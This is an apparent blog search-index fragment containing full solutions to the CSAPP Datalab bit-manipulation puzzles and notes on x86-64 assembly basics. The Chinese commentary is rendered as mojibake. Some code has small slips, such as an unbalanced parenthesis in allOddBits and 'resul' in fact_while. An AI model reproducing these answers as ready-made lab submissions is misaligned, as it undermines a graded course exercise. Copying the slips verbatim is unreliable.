","date":"2021-01-25","objectID":"/csapp-datalab/:1:0","series":null,"tags":["Pwn"],"title":"CSAPP Datalab","uri":"/csapp-datalab/#list"},{"categories":["Pwning"],"content":"bitCor (x, y) /* * bitXor - x^y using only ~ and \u0026 * Example: bitXor(4, 5) = 1 * Legal ops: ~ \u0026 * Max ops: 14 * Rating: 1 */ int bitXor(int x, int y) { return ~(~x\u0026~y)\u0026~(x\u0026y); } å°±åƒæ•°ç”µä¸­çš„å¼‚æˆ–æ‹†å¼€ä¸€æ ·ã€‚ ","date":"2021-01-25","objectID":"/csapp-datalab/:2:0","series":null,"tags":["Pwn"],"title":"CSAPP Datalab","uri":"/csapp-datalab/#bitcor-x-y"},{"categories":["Pwning"],"content":"tmin() /* * tmin - return minimum two's complement integer * Legal ops: ! ~ \u0026 ^ | + \u003c\u003c \u003e\u003e * Max ops: 4 * Rating: 1 */ int tmin(void) { return 1\u003c\u003c31; } æœ€å°çš„è¡¥ç ï¼Œæ­£æ•°ä½å…¨ä¸ºé›¶ï¼Œç¬¦å·ä½ä¸º1ã€‚ ","date":"2021-01-25","objectID":"/csapp-datalab/:3:0","series":null,"tags":["Pwn"],"title":"CSAPP Datalab","uri":"/csapp-datalab/#tmin"},{"categories":["Pwning"],"content":"isTmax(x) /* * isTmax - returns 1 if x is the maximum, two's complement number, * and 0 otherwise * Legal ops: ! ~ \u0026 ^ | + * Max ops: 10 * Rating: 2 */ int isTmax(int x) { int i=x+1; x+=i; x=~x;//get a zero only if x=0xfff..ff or 0x7ff..ff i=!i; x=x+i; return !x; } 7ffff...çš„ä¸€ä¸ªç‰¹æ€§ï¼Œå…¶+1åçš„ç»“æœä¸åŸæ•°çš„å’Œä¸ºffffff...ï¼Œè€Œffff...ä¹Ÿæœ‰è¿™ä¸ªç‰¹æ€§ï¼Œæ‰€ä»¥é€šè¿‡è¿™ä¸ªæ€§è´¨å¯ä»¥è¿‡æ»¤å…¶ä»–æ•°ï¼Œå–åä¹‹åä¸º0000000...ã€‚ç¬¬äºŒä¸ªæ€§è´¨ï¼Œ7ffff...+1ä¹‹åä¸ä¸º0ï¼Œè€Œffffff...+1åä¸º0ã€‚é€šè¿‡è¿™ä¸ªæ€§è´¨æ¥è¿‡æ»¤ffffff... ","date":"2021-01-25","objectID":"/csapp-datalab/:4:0","series":null,"tags":["Pwn"],"title":"CSAPP Datalab","uri":"/csapp-datalab/#istmaxx"},{"categories":["Pwning"],"content":"allOddBits(x) /* * allOddBits - return 1 if all odd-numbered bits in word set to 1 * Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1 * Legal ops: ! ~ \u0026 ^ | + \u003c\u003c \u003e\u003e * Max ops: 12 * Rating: 2 */ int allOddBits(int x) { int m=0xAA+(0xAA\u003c\u003c8); m=m+(m\u003c\u003c16); return !((m\u0026x)^m)); } æ„é€ å‡ºå¥‡æ•°ä½å…¨ä¸º1çš„æ•°0xAAAAAAAAï¼Œä¸xç›¸ä¸å–å¾—å…¶å¥‡æ•°ä½ï¼Œå†è¿›è¡Œå¼‚æˆ–å–åï¼Œç›¸åŒä¸º1ï¼Œä¸åŒä¸º0ã€‚ ","date":"2021-01-25","objectID":"/csapp-datalab/:5:0","series":null,"tags":["Pwn"],"title":"CSAPP Datalab","uri":"/csapp-datalab/#alloddbitsx"},{"categories":["Pwning"],"content":"negate(x) /* * negate - return -x * Example: negate(1) = -1. * Legal ops: ! ~ \u0026 ^ | + \u003c\u003c \u003e\u003e * Max ops: 5 * Rating: 2 */ int negate(int x) { x=~x+1; return x; } ","date":"2021-01-25","objectID":"/csapp-datalab/:6:0","series":null,"tags":["Pwn"],"title":"CSAPP Datalab","uri":"/csapp-datalab/#negatex"},{"categories":["Pwning"],"content":"isAsciiDigit(x) /* * isAsciiDigit - return 1 if 0x30 \u003c= x \u003c= 0x39 (ASCII codes for characters '0' to '9') * Example: isAsciiDigit(0x35) = 1. * isAsciiDigit(0x3a) = 0. * isAsciiDigit(0x05) = 0. * Legal ops: ! ~ \u0026 ^ | + \u003c\u003c \u003e\u003e * Max ops: 15 * Rating: 3 */ int isAsciiDigit(int x) { int A=x+(~0x39+1);//x-0x39\u003c=0--\u003ex+~0x39+1\u003c=0--\u003e(x+~0x39+1)\u003e\u003e31 int B=!((x+(~0x30+1))\u003e\u003e31);//x-0x30\u003e=0--\u003ex+~0x30+1\u003e=0--\u003e!((x+~0x30+1)\u003e\u003e31) return B\u0026((!A)|(A\u003e\u003e31)); } ","date":"2021-01-25","objectID":"/csapp-datalab/:7:0","series":null,"tags":["Pwn"],"title":"CSAPP Datalab","uri":"/csapp-datalab/#isasciidigitx"},{"categories":["Pwning"],"content":"conditional(x , y, z) /* * conditional - same as x ? y : z * Example: conditional(2,4,5) = 4 * Legal ops: ! ~ \u0026 ^ | + \u003c\u003c \u003e\u003e * Max ops: 16 * Rating: 3 */ int conditional(int x, int y, int z) { x=!!x; x=~x+1; return (x\u0026y)|((~x)\u0026z); } å…ˆå°†xè½¬åŒ–ä¸ºé€»è¾‘å€¼ã€‚xä¸ºçœŸæ—¶è®©xä¸yçš„è¿ç®—ç­‰äºyï¼Œxä¸zçš„è¿ç®—ä¸º0.å› ä¸ºè¦ä¿å­˜æ•°å€¼ï¼Œæ‰€ä»¥æƒ³åˆ°\u0026æ“ä½œã€‚å› ä¸ºæˆ‘ä»¬è¦ä¿å­˜æ‰€æœ‰ä½ï¼Œæ‰€ä»¥å–å…¶ç›¸åæ•°ã€‚å–zçš„æƒ…å†µæ­£å¥½ç›¸åã€‚ ","date":"2021-01-25","objectID":"/csapp-datalab/:8:0","series":null,"tags":["Pwn"],"title":"CSAPP Datalab","uri":"/csapp-datalab/#conditionalx--y-z"},{"categories":["Pwning"],"content":"isLessOrEqual(x, y) /* * isLessOrEqual - if x \u003c= y then return 1, else return 0 * Example: isLessOrEqual(4,5) = 1. * Legal ops: ! ~ \u0026 ^ | + \u003c\u003c \u003e\u003e * Max ops: 24 * Rating: 3 */ int isLessOrEqual(int x, int y) { int A=(x\u003e\u003e31)\u00261; int B=(y\u003e\u003e31)\u00261; int C=A^B; int D=((y+(~x+1))\u003e\u003e31)\u00261; return (C\u0026A)|(!C\u0026!D); } ä¸åŒç¬¦å·çš„æ•°ç›¸å‡ä¼šå‡ºç°æº¢å‡ºï¼Œæ‰€ä»¥åˆ†ä¸ºä¸¤ç§æƒ…å†µ ç¬¦å·ä¸åŒï¼Œxç¬¦å·ä¸º1æ—¶ï¼Œæ¡ä»¶ä¸ºçœŸã€‚ ç¬¦å·ç›¸åŒï¼Œè¿›è¡Œy-xï¼Œå½“ä¸”ä»…å½“ç¬¦å·ä½ä¸º0æ—¶ï¼Œæ¡ä»¶ä¸ºçœŸã€‚ ","date":"2021-01-25","objectID":"/csapp-datalab/:9:0","series":null,"tags":["Pwn"],"title":"CSAPP Datalab","uri":"/csapp-datalab/#islessorequalx-y"},{"categories":["Pwning"],"content":"logicalNeg(x)) /* * logicalNeg - implement the ! operator, using all of * the legal operators except ! * Examples: logicalNeg(3) = 0, logicalNeg(0) = 1 * Legal ops: ~ \u0026 ^ | + \u003c\u003c \u003e\u003e * Max ops: 12 * Rating: 4 */ int logicalNeg(int x) { return (~(x|(~x+1))\u003e\u003e31)\u00261; } 0çš„ç›¸åæ•°æ˜¯å…¶æœ¬èº«~ ","date":"2021-01-25","objectID":"/csapp-datalab/:10:0","series":null,"tags":["Pwn"],"title":"CSAPP Datalab","uri":"/csapp-datalab/#logicalnegx"},{"categories":["Pwning"],"content":"howManyBits(x) /* howManyBits - return the minimum number of bits required to represent x in * two's complement * Examples: howManyBits(12) = 5 * howManyBits(298) = 10 * howManyBits(-5) = 4 * howManyBits(0) = 1 * howManyBits(-1) = 1 * howManyBits(0x80000000) = 32 * Legal ops: ! ~ \u0026 ^ | + \u003c\u003c \u003e\u003e * Max ops: 90 * Rating: 4 */ int howManyBits(int x) { int b16,b8,b4,b2,b1,b0; int sign=x\u003e\u003e31; x = (sign\u0026~x)|(~sign\u0026x); b16 = !!(x\u003e\u003e16)\u003c\u003c4; x = x\u003e\u003eb16; b8 = !!(x\u003e\u003e8)\u003c\u003c3; x = x\u003e\u003eb8; b4 = !!(x\u003e\u003e4)\u003c\u003c2; x = x\u003e\u003eb4; b2 = !!(x\u003e\u003e2)\u003c\u003c1; x = x\u003e\u003eb2; b1 = !!(x\u003e\u003e1); x = x\u003e\u003eb1; b0 = x; return b16+b8+b4+b2+b1+b0+1; } å¦‚æœæ˜¯ä¸€ä¸ªæ­£æ•°ï¼Œåˆ™éœ€è¦æ‰¾åˆ°å®ƒæœ€é«˜çš„ä¸€ä½ï¼ˆå‡è®¾æ˜¯nï¼‰æ˜¯1çš„ï¼Œå†åŠ ä¸Šç¬¦å·ä½ï¼Œç»“æœä¸ºn+1ï¼›å¦‚æœæ˜¯ä¸€ä¸ªè´Ÿæ•°ï¼Œåˆ™éœ€è¦çŸ¥é“å…¶æœ€é«˜çš„ä¸€ä½æ˜¯0çš„ï¼ˆä¾‹å¦‚4ä½çš„1101å’Œä¸‰ä½çš„101è¡¥ç è¡¨ç¤ºçš„æ˜¯ä¸€ä¸ªå€¼ï¼š-3ï¼Œæœ€å°‘éœ€è¦3ä½æ¥è¡¨ç¤ºï¼‰ã€‚ ","date":"2021-01-25","objectID":"/csapp-datalab/:11:0","series":null,"tags":["Pwn"],"title":"CSAPP Datalab","uri":"/csapp-datalab/#howmanybitsx"},{"categories":["Pwning"],"content":"float_twice(uf) /* * float_twice - Return bit-level equivalent of expression 2*f for * floating point argument f. * Both the argument and result are passed as unsigned int's, but * they are to be interpreted as the bit-level representation of * single-precision floating point values. * When argument is NaN, return argument * Legal ops: Any integer/unsigned operations incl. ||, \u0026\u0026. also if, while * Max ops: 30 * Rating: 4 */ unsigned float_twice(unsigned uf) { int exp=(uf\u00260x7f800000)\u003e\u003e23; int sign=uf\u0026(1\u003c\u003c31); if(exp==0) return (uf\u003c\u003c1)|sign; if(exp==255) return uf; exp++; if(exp==255) return 0x7f800000|sign; return (exp\u003c\u003c23|sign)|(uf\u00260x807fffff); } *2åªéœ€è¦å¯¹å…¶expå­—æ®µè¿›è¡Œæ“ä½œï¼Œå¹¶æ ¹æ®æµ®ç‚¹æ•°çš„ä¸åŒæƒ…å†µè¿”å›æ•°å€¼ã€‚ ","date":"2021-01-25","objectID":"/csapp-datalab/:12:0","series":null,"tags":["Pwn"],"title":"CSAPP Datalab","uri":"/csapp-datalab/#float_twiceuf"},{"categories":["Pwning"],"content":"float_i2f(uf) /* * float_i2f - Return bit-level equivalent of expression (float) x * Result is returned as unsigned int, but * it is to be interpreted as the bit-level representation of a * single-precision floating point values. * Legal ops: Any integer/unsigned operations incl. ||, \u0026\u0026. also if, while * Max ops: 30 * Rating: 4 */ unsigned float_i2f(int x) { unsigned ux, mask, temp, e, sign = 0; int E = 0, count; if(!x) return 0; if(x\u00260x80000000){ ux = ~x+1; sign = 0x80000000; } else ux=x; temp = ux; while(temp){ E += 1; temp = temp\u003e\u003e1; } ux = ux\u0026(~(1\u003c\u003c(E-1))); e = E+126; if(E\u003c=24){ ux = ux\u003c\u003c(24-E); }else{ count = 0; while(E\u003e25){ if(ux\u00260x01) count+=1; ux = ux\u003e\u003e1; E -= 1; } mask = ux\u00260x01; ux = ux\u003e\u003e1; if(mask){ if(count) ux+=1; else{ if(ux\u00260x01) ux+=1; } } if(ux\u003e\u003e23){ e+=1; ux = ux\u00260x7FFFFF; } } return sign+(e\u003c\u003c23)+ux; } å°†è¡¥ç è½¬åŒ–ä¸ºæµ®ç‚¹æ•°ç¼–ç æ­¥éª¤ï¼š å°†è¡¥ç è½¬åŒ–ä¸ºæ— ç¬¦å·æ•°ï¼Œå¹¶æ ¹æ®è¡¥ç çš„ç¬¦å·æ¥è®¾ç½®æµ®ç‚¹æ•°çš„ç¬¦å·ä½ å› ä¸ºè¡¥ç ä¸€å®šæ˜¯å¤§äºç­‰äº0çš„æ•°ï¼Œæ‰€ä»¥è¦ä¹ˆä¸º0ï¼Œè¦ä¹ˆä¸ºè§„æ ¼åŒ–æ•°ã€‚å¦‚æœæ˜¯è§„æ ¼åŒ–æ•°ï¼Œé¦–å…ˆç»Ÿè®¡é™¤äº†æœ€é«˜æœ‰æ•ˆä½å¤–ä¸€å…±éœ€è¦å‡ ä½ï¼Œå¾—åˆ°çš„å°±æ˜¯Eï¼Œç„¶åé€šè¿‡$ E = e + 1-2^{k-1}$å¾—åˆ°è§£ç ä½ä¸º $e=E-1+2^{k-1}$ã€‚ æ— ç¬¦å·æ•°åé¢Eä½å°±æ˜¯å°¾æ•°éƒ¨åˆ†ï¼Œä½†æ˜¯éœ€è¦åˆ¤æ–­è¯¥éƒ¨åˆ†æ˜¯å¦23ä½ï¼Œå¦‚æœå°äº23ä½ï¼Œç›´æ¥å°†å…¶å·¦ç§»å¡«å……ï¼›å¦‚æœå¤§äº23ä½ï¼Œéœ€è¦å¯¹å…¶è¿›è¡Œèˆå…¥ï¼š å¦‚æœæ˜¯ä¸­é—´å€¼ï¼Œå°±éœ€è¦å‘å¶æ•°èˆå…¥ å¦‚æœä¸æ˜¯ä¸­é—´å€¼ï¼Œå°±éœ€è¦å‘æœ€è¿‘çš„è¿›è¡Œèˆå…¥ ","date":"2021-01-25","objectID":"/csapp-datalab/:13:0","series":null,"tags":["Pwn"],"title":"CSAPP Datalab","uri":"/csapp-datalab/#float_i2fuf"},{"categories":["Pwning"],"content":"float_f2i(uf) /* * float_f2i - Return bit-level equivalent of expression (int) f * for floating point argument f. * Argument is passed as unsigned int, but * it is to be interpreted as the bit-level representation of a * single-precision floating point value. * Anything out of range (including NaN and infinity) should return * 0x80000000u. * Legal ops: Any integer/unsigned operations incl. ||, \u0026\u0026. also if, while * Max ops: 30 * Rating: 4 */ int float_f2i(unsigned uf) { int s_ = uf\u003e\u003e31; int exp_ = ((uf\u00260x7f800000)\u003e\u003e23)-127; int frac_ = (uf\u00260x007fffff)|0x00800000; if(!(uf\u00260x7fffffff)) return 0; if(exp_ \u003e 31) return 0x80000000; if(exp_ \u003c 0) return 0; if(exp_ \u003e 23) frac_ \u003c\u003c= (exp_-23); else frac_ \u003e\u003e= (23-exp_); if(!((frac_\u003e\u003e31)^s_)) return frac_; else if(frac_\u003e\u003e31) return 0x80000000; else return ~frac_+1; } å°†æµ®ç‚¹æ•°è½¬åŒ–ä¸ºè¡¥ç æ­¥éª¤ï¼š é¦–å…ˆå‡è®¾æµ®ç‚¹æ•°ä¸ºè§„æ ¼åŒ–æ•°ï¼Œåˆ™ $E=e-bias$å¾—åˆ°æŒ‡æ•°éƒ¨åˆ†ï¼Œæˆ‘ä»¬çŸ¥é“å¦‚æœ$E\u003c0$ï¼Œåˆ™è®¡ç®—å‡ºæ¥çš„ç»“æœä¸€å®šæ˜¯å°æ•°ï¼ˆåŒ…æ‹¬éè§„æ ¼åŒ–æ•°ï¼‰ï¼Œæ­¤æ—¶èƒ½ç›´æ¥èˆå…¥åˆ°0ï¼›å¦‚æœ $E\u003e31$ï¼Œè¡¨ç¤ºè‡³å°‘è¦å°†å°¾æ•°éƒ¨åˆ†å³ç§»31ä½ï¼Œæ­¤æ—¶ä¸€å®šä¼šè¶…è¿‡è¡¥ç çš„è¡¨ç¤ºèŒƒå›´ï¼Œæ‰€ä»¥ç›´æ¥å°†å…¶æº¢å‡ºã€‚ å¯é€šè¿‡æœ€ä½23ä½å¾—åˆ°å°¾æ•°éƒ¨åˆ† å°¾æ•°éƒ¨åˆ†éœ€è¦è‡ªå·±åœ¨æœ€é«˜æœ‰æ•ˆä½æ·»1ï¼Œå¦‚æœæ˜¯è´Ÿæ•°ï¼Œåˆ™è¡¥ç çš„æœ€é«˜ä½ä¸º1ï¼Œå°±è¦æ±‚å…¶å¯¹åº”çš„æ— ç¬¦å·ç¼–ç æœ€é«˜ä½ä¸ä¸º1ï¼Œå¦åˆ™æ˜¯è´Ÿæº¢å‡ºæº¢å‡ºï¼›å¦‚æœæ˜¯æ•´æ•°ï¼Œåˆ™è¡¥ç çš„æœ€é«˜ä½ä¸º0ï¼Œå°±è¦æ±‚å…¶ç¼–ç çš„æœ€é«˜ä½ä¸º0ï¼Œå¦åˆ™æ˜¯æ­£æº¢å‡ºã€‚ å¿…é¡»çºªå¿µä¸€ä¸‹~~ niebelungen@LAPTOP-xxxxxxxx:/mnt/c/download/datalab-handout$ ./btest Score Rating Errors Function 1 1 0 bitXor 1 1 0 tmin 2 2 0 isTmax 2 2 0 allOddBits 2 2 0 negate 3 3 0 isAsciiDigit 3 3 0 conditional 3 3 0 isLessOrEqual 4 4 0 logicalNeg 4 4 0 howManyBits 4 4 0 float_twice 4 4 0 float_i2f 4 4 0 float_f2i Total points: 37/37 ","date":"2021-01-25","objectID":"/csapp-datalab/:14:0","series":null,"tags":["Pwn"],"title":"CSAPP Datalab","uri":"/csapp-datalab/#float_f2iuf"},{"categories":["Pwning"],"content":"Lecture 03","date":"2021-01-25","objectID":"/csapp-lecture-03/:0:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 03","uri":"/csapp-lecture-03/#lecture-03"},{"categories":["Pwning"],"content":"Machine-Level Programming â… : Basics","date":"2021-01-25","objectID":"/csapp-lecture-03/:0:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 03","uri":"/csapp-lecture-03/#machine-level-programming--basics"},{"categories":["Pwning"],"content":"History of Intel processors and architecturesä»‹ç»äº†Intel x86çš„å†å²ï¼Œä¸é‡è¦ã€‚ ","date":"2021-01-25","objectID":"/csapp-lecture-03/:1:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 03","uri":"/csapp-lecture-03/#history-of-intel-processors-and-architectures"},{"categories":["Pwning"],"content":"C, assmbly, machine code**CPU: ** PC: Programmer counter Address of next instruction Called â€œRIPâ€ (x86-64) Register file Heaviy used program dataï¼ˆç¨‹åºä¸»è¦ä½¿ç”¨å¯„å­˜å™¨æ¥å®ç°åŠŸèƒ½ï¼‰ Condition codes å‚¨å­˜çŠ¶æ€ä¿¡æ¯ ç”±æŒ‡ä»¤é›†ä½“ç³»ç»“æ„æˆ–**æŒ‡ä»¤é›†æ¶æ„ï¼ˆInstruction Set Architectureï¼ŒISAï¼‰**æ¥å®šä¹‰æœºå™¨çº§ç¨‹åºçš„æ ¼å¼å’Œè¡Œä¸ºï¼Œå®ƒå®šä¹‰äº†å¤„ç†å™¨çŠ¶æ€ã€æŒ‡ä»¤çš„æ ¼å¼ï¼Œä»¥åŠæ¯æ¡æŒ‡ä»¤å¯¹çŠ¶æ€çš„å½±å“ã€‚å¤§å¤šæ•°ISAéƒ½å°†ç¨‹åºçš„è¡Œä¸ºæè¿°ä¸ºæŒ‰é¡ºåºæ‰§è¡Œæ¯æ¡æŒ‡ä»¤ã€‚è¿™æ˜¯ç¼–è¯‘å™¨çš„ç›®æ ‡ï¼Œæä¾›ä¸€ç³»åˆ—æŒ‡ä»¤å‘Šè¯‰æœºå™¨è¦åšä»€ä¹ˆã€‚è€Œå¾®ç»“æ„æ˜¯æŒ‡è¿™ä¸ªæ¶æ„çš„å®ç°ã€‚ Memory: å†…å­˜å¯è®¤ä¸ºæ˜¯ä¸ªå­—èŠ‚æ•°ç»„ ä»£ç å’Œæ•°æ® æ ˆæ”¯æŒç¨‹åºè¿è¡Œ x86-64ï¼Œå®ƒæ˜¯Intel 64ä½ä½“ç³»ç»“æ„ï¼Œå®ƒçš„å‰èº«æ˜¯32ä½çš„IA32ã€‚x86æ˜¯å¯¹Intelå¤„ç†å™¨çš„å£å¤´ç§°å‘¼ï¼Œå› ä¸ºç¬¬ä¸€ä¸ªèŠ¯ç‰‡è¢«ç§°ä¸º8086ã€‚x86åˆè¢«ç§°ä¸ºå¤æ‚æŒ‡ä»¤é›†è®¡ç®—æœºï¼ˆComplex Instruction Set Computerï¼ŒCISCï¼‰ã€‚ç›®å‰å¤„ç†å™¨å’Œå¸¸ç”¨çš„å¦ä¸€å¤§ç±»æ˜¯ARMï¼ˆAcorn RISC Machineï¼‰ï¼ŒRISCæ˜¯ç²¾ç®€æŒ‡ä»¤é›†è®¡ç®—æœºï¼ˆReduced Instruction Set Computerï¼‰ï¼Œç”±äºå®ƒæ›´ç®€å•ï¼Œæ‰€ä»¥å®ƒæ¯”x86æœºå™¨åŠŸè€—æ›´ä½ã€‚ gcc -Og -S xxx.c: ç¼–è¯‘å‘½ä»¤ï¼Œæœ€åç”Ÿæˆï¼Œxxx.oæ–‡ä»¶ã€‚ -Ogï¼šæ˜¯ç”Ÿæˆæœºå™¨ä»£ç çš„ä¼˜åŒ–ç­‰çº§ï¼Œè¿™ä¸ªè¡¨ç¤ºç¼–è¯‘å™¨ä¼šç”Ÿæˆç¬¦åˆåŸå§‹Cä»£ç æ•´ä½“ç»“æ„çš„æœºå™¨ä»£ç ï¼Œè¿™æ˜¯ç”¨äºè°ƒè¯•çš„çº§åˆ«ï¼Œä¾¿äºæˆ‘ä»¬å­¦ä¹ è§‚å¯Ÿã€‚å…¶ä»–çš„-O1æˆ–-O2ä¼šå¾—åˆ°æ›´å¥½çš„ç¨‹åºæ€§èƒ½ï¼Œä½†æ˜¯æœºå™¨ä»£ç å’Œæºä»£ç çš„å…³ç³»å°±æ¯”è¾ƒéš¾ä»¥ç†è§£ã€‚ -Sï¼šåªç”Ÿæˆåˆ°æ±‡ç¼–ä»£ç  -cï¼šç”ŸæˆäºŒè¿›åˆ¶æ–‡ä»¶ objdump -d xxx.o: åæ±‡ç¼–å‘½ä»¤ã€‚å°†æœºå™¨ç åç¼–è¯‘ä¸ºæ±‡ç¼–ä»£ç ã€‚ ","date":"2021-01-25","objectID":"/csapp-lecture-03/:2:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 03","uri":"/csapp-lecture-03/#c-assmbly-machine-code"},{"categories":["Pwning"],"content":"æ±‡ç¼–ä»£ç æ±‡ç¼–æŒ‡ä»¤çš„ä¸¤ç§æ ¼å¼Intelå’ŒAT\u0026Tã€‚ä¹¦ä¸­å±•ç¤ºçš„ä¸ºAT\u0026Tçš„æ ¼å¼ã€‚ Cå£°æ˜ Intelæ•°æ®ç»“æ„ æ±‡ç¼–ä»£ç åç¼€ å¤§å°ï¼ˆå­—èŠ‚ï¼‰ char å­—èŠ‚ b 1 short å­— w 2 int åŒå­— l 4 long å››å­— q 8 char* å››å­— q 8 float å•ç²¾åº¦ s 4 double åŒç²¾åº¦ l 8 å¯„å­˜å™¨ä¿¡æ¯ï¼š AT\u0026TæŒ‡ä»¤æ“ä½œæ ¼å¼ï¼š ","date":"2021-01-25","objectID":"/csapp-lecture-03/:3:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 03","uri":"/csapp-lecture-03/#æ±‡ç¼–ä»£ç "},{"categories":["Pwning"],"content":"Machine-Level Programming â…¡: Control","date":"2021-01-25","objectID":"/csapp-lecture-03/:0:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 03","uri":"/csapp-lecture-03/#machine-level-programming--control"},{"categories":["Pwning"],"content":"æ•°æ®ä¼ é€æŒ‡ä»¤ æŒ‡ä»¤ æè¿° movzbw é›¶æ‰©å±•çš„å­—èŠ‚åˆ°å­— movzbl é›¶æ‰©å±•çš„å­—èŠ‚åˆ°åŒå­— movzwl é›¶æ‰©å±•çš„å­—åˆ°åŒå­— movzbq é›¶æ‰©å±•çš„å­—èŠ‚åˆ°å››å­— movzwq é›¶æ‰©å±•çš„å­—åˆ°å››å­— æŒ‡ä»¤ æè¿° movsbw ç¬¦å·æ‰©å±•çš„å­—èŠ‚åˆ°å­— movsbl ç¬¦å·æ‰©å±•çš„å­—èŠ‚åˆ°åŒå­— movswl ç¬¦å·æ‰©å±•çš„å­—åˆ°åŒå­— movsbq ç¬¦å·æ‰©å±•çš„å­—èŠ‚åˆ°å››å­— movswq ç¬¦å·æ‰©å±•çš„å­—åˆ°å››å­— movslq ç¬¦å·æ‰©å±•çš„åŒå­—åˆ°å››å­— cltq æŠŠ%eaxç¬¦å·æ‰©å±•åˆ°%rax æ•´æ•°ç®—æœ¯æ“ä½œ ","date":"2021-01-25","objectID":"/csapp-lecture-03/:1:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 03","uri":"/csapp-lecture-03/#æ•°æ®ä¼ é€æŒ‡ä»¤"},{"categories":["Pwning"],"content":"æ§åˆ¶æ¡ä»¶ç  **ZFï¼š**é›¶æ ‡å¿—ï¼Œæœ€è¿‘çš„æ“ä½œå¾—åˆ°çš„ç»“æœæ˜¯å¦ä¸º0ã€‚ æ— ç¬¦å·æ•°ï¼š **CFï¼š**è¿›ä½æ ‡å¿—ï¼Œæœ€è¿‘çš„æ“ä½œä½¿å¾—æœ€é«˜ä½äº§ç”Ÿè¿›ä½ã€‚å¯ç”¨æ¥æ£€æŸ¥æ— ç¬¦å·æ•°æ˜¯å¦å­˜åœ¨æº¢å‡ºã€‚ è¡¥ç ï¼š **SFï¼š**ç¬¦å·æ ‡å¿—ï¼Œæœ€è¿‘çš„æ“ä½œå¾—åˆ°çš„ç»“æœä¸ºè´Ÿæ•°ã€‚ **OFï¼š**æº¢å‡ºæ ‡å¿—ï¼Œæœ€è¿‘çš„æ“ä½œå¯¼è‡´è¡¥ç æº¢å‡ºã€‚ leaä¸ä¼šè®¾ç½®æ¡ä»¶ç ï¼Œå› ä¸ºå®ƒåªæ˜¯å•çº¯è®¡ç®—åœ°å€ã€‚ CMP S1, S2ï¼šç”¨æ¥æ¯”è¾ƒS1å’ŒS2ï¼Œæ ¹æ®S2-S1çš„ç»“æœæ¥è®¾ç½®æ¡ä»¶ç ã€‚ TEST S1, S2ï¼šæ ¹æ®S1 \u0026 S2çš„ç»“æœæ¥è®¾ç½®æ¡ä»¶ç ã€‚ è¿˜æœ‰ä¸€ç³»åˆ—çš„setæŒ‡ä»¤ä¸“é—¨ç”¨æ¥è®¾ç½®æ¡ä»¶ç  æ— æ¡ä»¶è·³è½¬ï¼šjmp æœ‰æ¡ä»¶è·³è½¬ï¼š åœ¨æ±‡ç¼–ä¸­é€šè¿‡æ¡ä»¶ç å®ç°åˆ†æ”¯æ§åˆ¶ä¸å¾ªç¯ã€‚ x86-64ä¸Šæä¾›äº†ä¸€äº›æ¡ä»¶ä¼ é€æŒ‡ä»¤CMOVï¼Œåªæœ‰åœ¨æ»¡è¶³æ¡ä»¶æ—¶ï¼Œæ‰ä¼šå°†æºæ•°æ®ä¼ é€åˆ°ç›®çš„ä¸­ï¼š ","date":"2021-01-25","objectID":"/csapp-lecture-03/:2:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 03","uri":"/csapp-lecture-03/#æ§åˆ¶"},{"categories":["Pwning"],"content":"å¾ªç¯do-whileï¼š long fact_do(long n){ long result = 1; do{ result *= n; n = n-1; }while(n\u003e1); return result; } fact_do: movl $1, %eax .L1: imulq %rdi, %rax subq $1, %rdi cmpq $1, %rdi jg .L1 rep; ret åœ¨å¾ªç¯ä½“çš„ç»“å°¾å¤„è¿›è¡Œåˆ¤æ–­æˆ–è·³è½¬ã€‚ whileï¼š long fact_while(long n){ long result = 1; while(n\u003e1){ result *= n; n = n-1; } return resul; } Jump-to-middleï¼šä¸€å¼€å§‹å°±æœ‰ä¸€ä¸ªæ— æ¡ä»¶è·³è½¬æŒ‡ä»¤ï¼Œç”¨æ¥è·³è½¬åˆ°åˆ¤æ–­è¯­å¥ã€‚å°±æ˜¯ç›¸ç­‰äºåœ¨do-whileå¾ªç¯çš„å¤–é¢å¥—äº†ä¸€å±‚è·³è½¬ã€‚ fact_while: movl $1, %eax jmp .JUDGE .L1: imulq %rdi, %rax subq $1, %rdi .JUDGE: cmpq $1, %rdi jg .L1 rep; ret guarded-doï¼šåœ¨å¼€å§‹ç›´æ¥è¿›è¡Œåˆ¤æ–­ã€‚è¿™ä¸ªä¹‹æ‰€ä»¥æ›´åŠ é«˜æ•ˆï¼Œæ˜¯å› ä¸ºä¸€å¼€å§‹è¿›å…¥å¾ªç¯æ—¶ï¼Œé€šå¸¸ä¸ä¼šä¸æ»¡è¶³å¾ªç¯æ¡ä»¶ï¼Œå³ä¸€å¼€å§‹ä¸ä¼šè·³è½¬åˆ°åé¢ï¼Œæ‰€ä»¥ä¼šç›´æ¥é¡ºåºä¸€ç›´æ‰§è¡Œå¾ªç¯ä½“ã€‚ï¼Œå½“ä½¿ç”¨è¾ƒé«˜ä¼˜åŒ–ç­‰çº§æ—¶ï¼Œæ¯”å¦‚-O1æ—¶ï¼ŒGCCä¼šä½¿ç”¨è¿™ç§ç­–ç•¥ã€‚ fact_while: cmpq $1, %rdi jle .L1 movl $1, %eax .L2: imulq %rdi, %rax subq $1, %rdi cmpq $1, %rdi jne .L2 rep; ret .L1: movl $1, %eax ret for: long fact_for(long n){ long i; long result = 1; for(i=2; i\u003c=n; i++){ result *= i; } return result; } å°†å…¶è½¬åŒ–ä¸ºwhileè¯­å¥ï¼ŒæŒ‰ç…§whileå¾ªç¯çš„æ–¹å¼è¿›è¡Œä¼˜åŒ–ã€‚ switch: switchè¯­å¥å¯ä»¥æ ¹æ®ä¸€ä¸ªæ•´æ•°ç´¢å¼•æ•°å€¼è¿›è¡Œå¤šé‡åˆ†æ”¯ã€‚é€šå¸¸ä½¿ç”¨**è·³è½¬è¡¨ï¼ˆJump Tableï¼‰**æ•°æ®ç»“æ„ä½¿å¾—å®ç°æ›´åŠ é«˜æ•ˆï¼Œå®ƒæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œæ¯ä¸ªå…ƒç´ æ˜¯å¯¹åº”çš„ä»£ç å—èµ·å§‹åœ°å€ï¼Œæ 